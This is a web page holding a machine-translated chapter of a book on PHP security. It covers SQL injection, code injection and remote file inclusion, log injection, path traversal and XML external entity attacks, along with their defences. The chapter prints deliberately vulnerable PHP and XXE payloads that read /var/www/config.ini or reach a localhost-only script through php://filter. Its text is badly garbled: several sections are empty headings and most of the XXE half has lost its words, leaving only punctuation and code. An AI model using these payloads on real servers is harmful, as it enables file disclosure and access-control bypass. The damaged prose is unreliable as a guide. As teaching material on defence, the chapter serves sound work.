<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The book "Security in PHP" (part 2). Code injection attacks</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The book "Security in PHP" (part 1) 


 In the list of the ten most common types of attacks according to OWASP, the first two places are occupied by a...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The book "Security in PHP" (part 2). Code injection attacks</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/webt/y5/ci/ny/y5cinyytrxtvvloarlb-hyw4v5w.png"></p><br><p>  <a href="https://habrahabr.ru/company/mailru/blog/310726/">The book "Security in PHP" (part 1)</a> </p><br><p>  In the list of the ten most common types of attacks according to OWASP, the first two places are occupied by attacks with code injection and XSS (cross-site scripting).  They go hand in hand, because XSS, like a number of other types of attacks, depends on the success of attacks with the introduction.  This name hides a whole class of attacks, during which data is embedded in a web application in order to force it to execute or interpret malicious code in the way the attacker needs.  Such attacks include, for example, XSS, SQL injection, header injection, code injection, and Full Path Disclosure.  And this is only a small part. </p><a name="habracut"></a><br><p>  Implementation attacks are a horror story for all programmers.  They are the most common and successful due to the diversity, scale and (sometimes) the complexity of protection against them.  All applications need to take data from somewhere.  XSS and UI Redress are especially common, so I dedicated separate chapters to them and separated them from the general class. </p><br><p>  OWASP offers the following definition of injection attacks: </p><br><p>  <em>Deployment capabilities ‚Äî such as SQL, OS, and LDAP ‚Äî occur when the interpreter receives unreliable data as part of a command query.</em>  <em>Malicious data can fool the interpreter and force it to execute certain commands or access unauthorized data.</em> </p><br><h2 id="vnedrenie-sql">  SQL injection </h2><br><p>  The introduction of SQL - the most common and extremely dangerous form of attacks with the introduction.  It is difficult to overestimate the seriousness of this threat, so it is extremely important to understand what influences the success of attacks and how to protect against them. </p><br><p>  So, the data is embedded in a web application, and then used in SQL queries.  Usually they come from unreliable input sources, such as web forms.  However, the deployment can be done from other places, say, from the database itself.  Programmers often believe in the complete security of their base, not realizing that if it was safe in one case, this does not at all mean that it will be safe in the future.  The data from the database should be considered unreliable until proven otherwise, that is, until they have passed the test. </p><br><p>  If the attack is successful, the attacker can manipulate the SQL query so that it performs operations with the database that are not provided for by the developers. </p><br><p>  Look at this request: </p><br><pre><code class="php hljs">$db = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> mysqli(<span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'username'</span></span>, <span class="hljs-string"><span class="hljs-string">'password'</span></span>, <span class="hljs-string"><span class="hljs-string">'storedb'</span></span>); $result = $db-&gt;query( <span class="hljs-string"><span class="hljs-string">'SELECT * FROM transactions WHERE user_id = '</span></span> . $_POST[<span class="hljs-string"><span class="hljs-string">'user_id'</span></span>] );</code> </pre> <br><p>  There are a number of stocks.  First, we did not check the contents of the POST data for <code>user_id</code> .  Secondly, we allow an unreliable source to tell us which <code>user_id</code> use: an attacker can slip any valid <code>user_id</code> .  It may have been contained in a hidden form field, which we considered safe because it cannot be edited (while forgetting that attackers can enter any data).  Thirdly, we did not screen <code>user_id</code> and did not pass it to the request as a parameter (bound parameter), which also allows the attacker to inject arbitrary rows that will manipulate the SQL query, given that we could not verify it first. </p><br><p>  These three omissions are very common in web applications. </p><br><p>  Regarding database trust, imagine that we searched for transactions using the <code>user_name</code> field.  Names have a wide scope and may contain quotes.  Suppose the attacker retains the embedded string value in one of the user names.  When we again use this value in one of the following queries, it will manipulate the query string, since we have considered the database as a reliable source, have not isolated or limited the compromised query. </p><br><p>  Also pay attention to another factor in SQL injection: it is not always necessary to keep persistent storage on the server.  HTML 5 supports client-side database usage, where you can send queries using SQL and JavaScript.  There are two APIs for this: WebSQL and IndexedDB.  In 2010, the W3C did not recommend choosing WebSQL;  It is supported by WebKit browsers that use SQLite as a backend.  Most likely, support will remain for the sake of backward compatibility, even despite the recommendation of the W3C.  As its name implies, this API accepts SQL queries, which means it can be the target of injection attacks.  IndexedDB is a newer alternative, the NoSQL database (does not require the use of SQL queries). </p><br><h3 id="primery-vnedreniya-sql">  SQL injection examples </h3><br><p>  Manipulating SQL queries can have the following goals: </p><br><ol><li>  Data leaks. </li><li>  Disclosure of stored information. </li><li>  Manipulation of stored information. </li><li>  Bypass authorization. </li><li>  SQL injection on the client side. </li></ol><br><h3 id="zaschita-ot-vnedreniya-sql">  SQL injection protection </h3><br><p>  Protection against SQL injection is based on the principle of separation.  Before using the data in the request, it is necessary to check that their form is correct.  It is also necessary to isolate the data prior to inclusion in the request or include it as a transition parameter. </p><br><h3 id="proverka">  <em>Check</em> </h3><br><p>  I do not get tired of repeating: all data that was not explicitly created in the source PHP code of the current request is unreliable.  Strictly check them and reject everything that did not pass checks.  Do not try to "fix" the data, you can make only light, cosmetic changes to the format. </p><br><p>  Frequent errors include checking data for further current use (for example, for display on the screen or for calculations) and the lack of verification of database fields in which information will be saved as a result. </p><br><h3 id="ekranirovanie">  <em>Screening</em> </h3><br><p>  With the <code>mysqli</code> extension you can isolate all the data included in the SQL query.  This is done by the <code>mysqli_real_escape_string()</code> function.  The <code>pgsql</code> extension for PostgresSQL offers the functions <code>pg_escape_bytea()</code> , <code>pg_escape_identifier()</code> , <code>pg_escape_literal()</code> and <code>pg_escape_string()</code> .  In the <code>mssql (Microsoft SQL Server)</code> extension <code>mssql (Microsoft SQL Server)</code> there are no isolating functions, and the approach using <code>addslashes()</code> inefficient - you will need a <a href="http://stackoverflow.com/questions/574805/how-to-escape-strings-in-mssql-using-php">custom function</a> . </p><br><p>  To further complicate your life, I will say that you have no right to mistake when isolating the data entered in the request.  One slip - and you are vulnerable to attack. </p><br><p>  Summarize.  Shielding is not the best defense.  To him it is necessary to resort as a last resort.  It may be necessary if the database library you are using for abstraction allows you to configure bare SQL queries or parts of a query without forcibly binding parameters.  In other cases, it is better to avoid isolation at all.  This approach is complex, provokes errors and differs depending on the database extension. </p><br><h3 id="parametrizovannye-zaprosy-zaranee-podgotovlennye-vyrazheniya">  <em>Parameterized queries (pre-prepared expressions)</em> </h3><br><p>  Parameterization, or parameter binding, is the recommended way to create SQL queries.  All good database libraries use it by default.  Here is an example of using the PDO extension for PHP: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(ctype_digit($_POST[<span class="hljs-string"><span class="hljs-string">'id'</span></span>]) &amp;&amp; is_int($_POST[<span class="hljs-string"><span class="hljs-string">'id'</span></span>])) { $validatedId = $_POST[<span class="hljs-string"><span class="hljs-string">'id'</span></span>]; $pdo = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PDO(<span class="hljs-string"><span class="hljs-string">'mysql:store.db'</span></span>); $stmt = $pdo-&gt;prepare(<span class="hljs-string"><span class="hljs-string">'SELECT * FROM transactions WHERE user_id = :id'</span></span>); $stmt-&gt;bindParam(<span class="hljs-string"><span class="hljs-string">':id'</span></span>, $validatedId, PDO::PARAM_INT); $stmt-&gt;execute(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-comment"><span class="hljs-comment">//   id      }</span></span></code> </pre> <br><p>  The <code>bindParam()</code> method, available for PDO expressions, allows you to bind parameters to ‚Äúplaceholders‚Äù (placeholders) represented in a previously prepared expression.  This method accepts the parameters of the main data types, for example, <code>PDO::PARAM_INT</code> , <code>PDO::PARAM_BOOL</code> , <code>PDO::PARAM_LOB</code> and <code>PDO::PARAM_STR</code> .  For <code>PDO::PARAM_STR</code> this is done by default unless otherwise specified, so remember for other values! </p><br><p>  Unlike manual isolation, parameter binding (or another method used by your database library) will allow you to isolate data that is automatically linked, so you don‚Äôt have to remember which function to use.  Also, coordinated parameter binding is much more reliable than trying not to forget that you need to isolate everything manually. </p><br><h3 id="realizaciya-principa-naimenshih-privilegiy">  <em>Implementation of the principle of least privilege</em> </h3><br><p>  Interrupting a successful SQL injection is as important as preventing it completely.  When an attacker gets the ability to execute SQL queries, he will do it as a specific database user.  Thanks to the principle of least privilege, you can make sure that all users have only those privileges that are absolutely necessary to perform their tasks. </p><br><p>  If a user has wide privileges, then an attacker can delete tables and change the privileges of other users, performing new SQL implementations on their behalf.  To prevent this from happening, never access the database from a web application as root, administrator, or another user with high privileges. </p><br><p>  Another application of the principle is the separation of the roles of reading and writing data to the database.  Select one user with write access only and another user with read only access.  If the attack is directed at the ‚Äúreading‚Äù user, then the attacker will not be able to manipulate the data in the table or write it down.  You can restrict access in even narrower frames, thereby reducing the effects of successful SQL injection attacks. </p><br><p>  Many web applications, especially open source, are designed so that they use only one database user, whose privileges are almost certainly never checked.  So do not forget about this moment and do not try to run applications under the administrator account. </p><br><h2 id="vnedrenie-koda-izvestno-kak-udalyonnoe-vklyuchenie-fayla-remote-file-inclusion">  Code injection (known as Remote File Inclusion, Remote File Inclusion) </h2><br><p>  Code injection is any way that allows an attacker to add source code to a web application with the ability to interpret and execute it.  In this case we are not talking about the implementation of code in the client part, for example in JavaScript, here XSS-attacks are already used. </p><br><p>  You can embed source code directly from an unreliable source of input data, or you can force a web application to load it from a local file system or an external resource like a URL.  When code is introduced as a result of the inclusion of an external source, it is usually called remote file inclusion (RFI), although RFI itself is always intended to embed the code. </p><br><p>  The main reasons for the introduction of code: </p><br><ul><li>  bypass input validation, </li><li>  the introduction of unreliable input data in any context where they will be regarded as PHP code, </li><li>  hacking the security of source code repositories, </li><li>  disable warnings about loading third-party libraries, </li><li>  reconfiguring the server so that it transfers non-PHP related files to the PHP interpreter. </li></ul><br><p>  Pay special attention to the last point: in this case, unreliable users can upload any files to the server. </p><br><h3 id="primery-vnedreniya-koda">  Code injection examples </h3><br><p>  In PHP, there are many goals for code injection, so this type of attack heads the watch list for any programmer. </p><br><h3 id="vklyuchenie-fayla">  <em>Include file</em> </h3><br><p>  The most obvious targets for code injection are the <code>include()</code> , <code>include_once()</code> , <code>require()</code> and <code>require_once()</code> functions.  If the unreliable input data allows you to determine the <code>path</code> parameter passed to these functions, you can remotely control the choice of file to include.  It should be noted that the included file does not have to be a real PHP file, it is allowed to use a file of any format capable of storing textual data (that is, almost without restrictions). </p><br><p>  The <code>path</code> parameter may also be vulnerable to directory traversal attacks or remote file inclusion.  Using combinations of ../ or ... characters in a <code>path</code> allows an attacker to navigate to almost any file that the PHP process has access to.  At the same time, in the default PHP configuration, the above functions take a URL, unless allow_url_include is disabled. </p><br><h3 id="proverka-1">  <em>Check</em> </h3><br><p>  The PHP <code>eval()</code> function accepts a string of PHP code for execution. </p><br><h3 id="vnedrenie-regulyarnyh-vyrazheniy">  <em>Implementation of regular expressions</em> </h3><br><p>  The PCRE function (Perl-compatible regular expression) <code>preg_replace()</code> in PHP allows the use of the e modifier (PREG_REPLACE_EVAL).  This means a replacement string, which after substitution will be considered PHP code.  And if there is unreliable input data in this line, they will be able to inject the executable PHP code. </p><br><h3 id="defektnaya-logika-vklyucheniya-fayla">  <em>Bad file enable logic</em> </h3><br><p>  Web applications, by definition, include the files needed to service any requests.  If we take advantage of defects in the logic of routing, dependency management, autoload, and other processes, then manipulating the path through the query or its parameters will cause the server to include specific local files.  Since the web application is not designed to handle such manipulations, the consequences can be unpredictable.  For example, an application will unwittingly light up routes intended only for use on the command line.  Or reveal other classes, the designers of which perform tasks (it is better not to design classes like this, but it still occurs).  Any of these scenarios can interfere with the backend operations of the application, which allows you to manipulate data or conduct a DOS attack on resource-intensive operations that do not imply direct access. </p><br><h3 id="zadachi-vnedreniya-koda">  Code Deployment Tasks </h3><br><p>  The range of tasks is extremely wide, since this type of attack allows you to execute any PHP code to choose an attacker. </p><br><h3 id="defenses-against-code-injection">  Defenses against Code Injection </h3><br><h2 id="command-injection">  Command injection </h2><br><h3 id="examples-of-command-injection">  Examples of Command Injection </h3><br><h3 id="defenses-against-command-injection">  Defenses against Command Injection </h3><br><h2 id="vnedrenie-loga-izvestno-kak-vnedrenie-log-fayla-log-file-injection">  Log deployment (known as log file injection, Log File Injection) </h2><br><p>  Many applications collect logs, and authorized users often view them through the HTML interface.  Therefore, logs are one of the main targets of intruders who want to disguise other attacks, deceive those who view the logs, and even conduct an attack on the users of the monitoring application, through which the logs are read and analyzed. </p><br><p>  The vulnerability of the logs depends on the mechanisms controlling the recording of logs, as well as on the handling of log data as an unreliable source when viewing and analyzing records. </p><br><p>  A simple journaling system can write text lines to a <code>file_put_contents()</code> using <code>file_put_contents()</code> .  For example, a programmer registers erroneous authorization attempts in the form of strings of the following format: </p><br><pre> <code class="php hljs">sprintf(<span class="hljs-string"><span class="hljs-string">"Failed login attempt by %s"</span></span>, $username);</code> </pre> <br><p>  But what if the attacker uses the name ‚ÄúAdminnSuccessful login by Adminn‚Äù in the form? </p><br><p>  If this line is inserted into the log from unreliable input data, then the attacker will successfully mask an unsuccessful authorization attempt with an innocent failure to enter the admin password.  The suspicion of data will decrease even more if you add a successful authorization attempt. </p><br><p>  Here the whole point is that the attacker is able to add various entries to the log.  You can also embed XSS-vector and even characters that make it difficult to read log entries in the console. </p><br><h3 id="zadachi-vnedreniya-loga">  Logging implementation tasks </h3><br><p>  One of the goals of implementation is the interpreter of the log format.  If the analysis tool uses regular expressions for parsing records in the log to divide them into parts and spread them across different fields, then you can create and implement such a string that will force regular expressions to choose embedded fields instead of correct ones.  For example, this entry can cause several problems: </p><br><pre> <code class="php hljs">$username = <span class="hljs-string"><span class="hljs-string">"iamnothacker! at Mon Jan 01 00:00:00 +1000 2009"</span></span>; sprintf(<span class="hljs-string"><span class="hljs-string">"Failed login attempt by %s at %s"</span></span>, $username, )</code> </pre> <br><p>  More sophisticated log injection attacks are based on directory traversal attacks to display logs in the browser.  Under suitable conditions, inserting a PHP code into a log message and opening a file with records in the browser will lead to successful code injection, neatly formatted and executed at the request of the attacker.  And if it comes to executing malicious PHP on the server, all that remains is to rely only on the effectiveness of defense separation, which can reduce the damage. </p><br><h3 id="zaschita-ot-vnedreniya-loga">  Protection from the introduction of the log </h3><br><p>  The easiest way is to filter all external log messages using the white list.  Suppose you limit the character set to only numbers, letters, and spaces.  Messages containing unresolved characters are considered damaged.  Then a record appears in the log about a potential attempt to embed the log file.  This is an easy way to protect simple text logs, when you cannot avoid including unreliable input data in messages. </p><br><p>  The second method of protection is the conversion of portions of unreliable input data using a system like <a href="https://ru.wikipedia.org/wiki/Base64">base64</a> , which supports a limited set of characters, while allowing you to store a variety of information in text form. </p><br><h2 id="obhod-puti-izvesten-kak-obhod-kataloga-directory-traversal">  Path traversal (known as directory traversal traversal) </h2><br><p>  Path bypass attacks are attempts to influence the read or write operation of files in the backend of a web application.  This is done through the implementation of parameters that allow you to manipulate the paths of files involved in backend operations.  So attacks of this type facilitate information disclosure and local / remote file injection. </p><br><p>  We will consider such attacks separately, but the basis of their success is precisely the detour of the path.  Since the functions described below are typical for manipulating file paths, it makes sense to mention that many PHP functions do not accept paths to files in the usual sense of the word.  Instead, functions like <code>include()</code> or <code>file()</code> take a URI. </p><br><p>  It looks completely unnatural.  But this means the equivalence of the two following function calls that use absolute paths (for example, without relying on autoloading relative paths). </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">include</span></span>(<span class="hljs-string"><span class="hljs-string">'/var/www/vendor/library/Class.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span>(<span class="hljs-string"><span class="hljs-string">'file:///var/www/vendor/library/Class.php'</span></span>);</code> </pre> <br><p>  The fact is that the relative path is processed on the side (setting <code>include_path</code> in php.ini and available autoloaders).  In such cases, PHP functions are especially vulnerable to many forms of parameter manipulation, including substitution of a file URI scheme (File URI Scheme Substitution), where an attacker can embed an HTTP or FTP URI if unreliable data is inserted at the beginning of the file path.  We'll talk more about this in the section on attacks with remote file inclusion, but for now let's focus on traversing file system paths. </p><br><p>  This vulnerability involves changing the path to access another file.  This is usually achieved by embedding a series of sequences ../ into an argument that is then attached to functions or inserted entirely into functions like <code>include()</code> , <code>require()</code> , <code>file_get_contents()</code> and even less suspicious (for someone) functions like <code>DOMDocument::load()</code> . </p><br><p>  Using the sequence ../, the attacker forces the system to return to the parent directory.  So the path <code>/var/www/public/../vendor</code> actually leads to <code>/var/www/vendor</code> .  The sequence ../ after / <code>public</code> returns us to the parent directory, i.e., to / <code>var/www</code> .  In this way, the attacker gains access to files located outside the / <code>public</code> directory accessible from the web server. </p><br><p>  Of course, bypassing the path is not limited to just one return.  You can embed new path elements to get access to child directories that are not accessible from the browser due to the restriction settings in .htaccess.  PHP file system operations do not care about the configuration of access control to non-public files and directories on the web server. </p><br><h3 id="examples-of-path-traversal">  Examples of Path Traversal </h3><br><h3 id="defenses-against-path-traversal">  Defenses against Path Traversal </h3><br><h2 id="vnedrenie-xml">  Implementing XML </h2><br><p>  Despite the introduction of JSON as a lightweight data transfer between server and client, XML remains a popular alternative, the web services API often supports it in parallel with JSON.  Also, XML is used to exchange data using XML schemas: RSS, Atom, SOAP and RDF, etc. </p><br><p>  XML is omnipresent: it can be found in web application servers, in browsers (as the preferred format for requests and responses of XMLHttpRequest) and browser extensions.  Considering its prevalence and default processing by such a popular parser like libxml2, used by PHP in the DOM and in the extensions SimpleXML and XMLReader, XML has become the target for injection attacks.  When the browser is actively involved in the XML exchange, it is necessary to take into account that through XSS, authorized users can transmit XML requests that are actually created by attackers. </p><br><h3 id="vnedrenie-vneshney-xml-suschnosti-xxe">  Implementing External XML Entities (XXE) </h3><br><p>  Such attacks are due to the fact that XML parsing libraries often support the use of links to custom entities.  You'll be introduced to the standard XML entity addition, used to represent special markup characters like <code>&amp;gt;</code>  , <code>&amp;lt</code> ;  and <code>&amp;apos</code> ;.  XML allows you to extend the set of standard entities by defining custom entities through the XML document itself.  They can be defined directly including in the optional DOCTYPE.  The extended value they represent can refer to an external resource that must be included. XXE-       XML   ,        .               .    XXE     XXE-,    . </p><br><p> ,  ,     harmless: </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE results [ &lt;!ENTITY harmless "completely harmless"&gt; ]&gt;</span></span></code> </pre> <br><p> XML-         &amp;harmless; ,    : </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE results [&lt;!ENTITY harmless "completely harmless"&gt;]&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span>This result is &amp;harmless;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  XML-  PHP DOM    XML,       ,   .       : </p><br><p> <code>This result is completely harmless</code> </p> <br><p> ,           XML     .   ,  XML    ,     . ,       ,       XML,   . ,     : </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE results [&lt;!ENTITY harmless SYSTEM "file:///var/www/config.ini"&gt;]&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span>&amp;harmless;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>              <code>&amp;harmless;</code>  .         XML-      -   . ,   .      XML,   ,   , .       .     XML,     XML,     ,    .   PHP   ,    ,   HTTP-   -,        . </p><br><p>  PHP        XML: PHP DOM, SimpleXML  XMLReader.     libxml2,      .  ,  PHP      XXE-,        -  ,  XML. </p><br><p>   ,  XHTML  HTML 5      XML.  ,  XHTML-  XML- HTML 5    XML,   <code>DOMDocument::loadXML()</code>  <code>DOMDocument::loadHTML()</code> .   XML-      XML-. ,  libxml2     HTML 5 DOCTYPE,       XHTML DOCTYPES. </p><br><h3 id="primery-vnedreniya-vneshnih-xml-suschnostey"> <em>   XML-</em> </h3><br><h3 id="soderzhimoe-fayla-i-raskrytie-informacii">      </h3><br><p>      , ,   XML-     . </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE results [&lt;!ENTITY harmless SYSTEM "file:///var/www/config.ini"&gt;]&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span>&amp;harmless;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>      <code>&amp;harmless;</code>    .      ,      ,    .           ,    ,    . ,      :     XML-,  ,       XML-.    ,        PHP: </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE results [ &lt;!ENTITY harmless SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/config.ini" &gt; ]&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span>&amp;harmless;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p> PHP       URI,   ,        : <code>file_get_contents()</code> , <code>require()</code> , <code>require_once()</code> , <code>file()</code> , <code>copy()</code>   .  PHP   ,      ,     .         ,   ,  <code>convert.base-64-encode</code> . </p><br><p>  ,        PHP ,    .       ,     .           ,            .  ,   , . </p><br><h3 id="obhod-kontrolya-dostupa">    </h3><br><p>    .  XXE-    -,      .                .     : </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_CLIENT_IP'</span></span>]) || <span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span></span>]) || !in_array(@$_SERVER[<span class="hljs-string"><span class="hljs-string">'REMOTE_ADDR'</span></span>], <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( <span class="hljs-string"><span class="hljs-string">'127.0.0.1'</span></span>, <span class="hljs-string"><span class="hljs-string">'::1'</span></span>, )) ) { header(<span class="hljs-string"><span class="hljs-string">'HTTP/1.0 403 Forbidden'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>( <span class="hljs-string"><span class="hljs-string">'You are not allowed to access this file.'</span></span> ); }</code> </pre> <br><p>   PHP,      ,     PHP-   , . . localhost.  XXE-        ,      ,    HTTP- XML-    localhost. </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE results [ &lt;!ENTITY harmless SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php" &gt; ]&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span>&amp;harmless;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">result</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">results</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>         ,       .        ,      . </p><br><h3 id="dos-ataki"> DOS- </h3><br><p>  DOS-    ,     .     XML-      HTTP-,       . </p><br><p>       DOS- XXE-     XML-. </p><br><h3 id="zaschita-ot-vnedreniya-vneshnih-xml-suschnostey"> <em>    XML-</em> </h3><br><p>    ,    ,     .  DOM, SimpleXML  XMLReader   libxml2,      <code>libxml_disable_entity_loader()</code> ,    . ,     ,    DOCTYPE,       ,   HTTP-     . </p><br><pre> <code class="php hljs">$oldValue = libxml_disable_entity_loader(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $dom = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> DOMDocument(); $dom-&gt;loadXML($xml); libxml_disable_entity_loader($oldValue);</code> </pre> <br><p>      ,   XML  ,    URI. </p><br><p> ,       ,                .          ¬´¬ª  XML, ,        XXE-: </p><br><pre> <code class="php hljs">libxml_disable_entity_loader(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>);</code> </pre> <br><p>      TRUE       .       ,   Docbook XML  HTML,   XSL-    . </p><br><p>   libxml2  ‚Äî  .     PHP-,    -   XML,    ¬´¬ª   . </p><br><p>    ,   ,   XML- DOCTYPE.         ,    XML-,   XML-          .   ,       ‚Äî  ,  .         .      ,          . </p><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">/** * Attempt a quickie detection */</span></span> $collapsedXML = preg_replace(<span class="hljs-string"><span class="hljs-string">"/[:space:]/"</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, $xml); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(preg_match(<span class="hljs-string"><span class="hljs-string">"/&lt;!DOCTYPE/i"</span></span>, $collapsedXml)) { <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> \InvalidArgumentException( <span class="hljs-string"><span class="hljs-string">'Invalid XML: Detected use of illegal DOCTYPE'</span></span> ); }</code> </pre> <br><p>      ,     .     -,   ?             ,     ,      (,    ).     ,  <code>libxml_disable_entity_loader()</code>     ,   ,     .       XML- (XML Entity Expansion). </p><br><h3 id="rasshirenie-xml-suschnosti">  XML- </h3><br><p>         XML-.        DOS-        .  DOCTYPE XML    , ,  ,     XML-        .          .      XML- HTML 5   ,      libxml2  HTML. </p><br><h3 id="primery-rasshireniya-xml-suschnosti"> <em>  XML-</em> 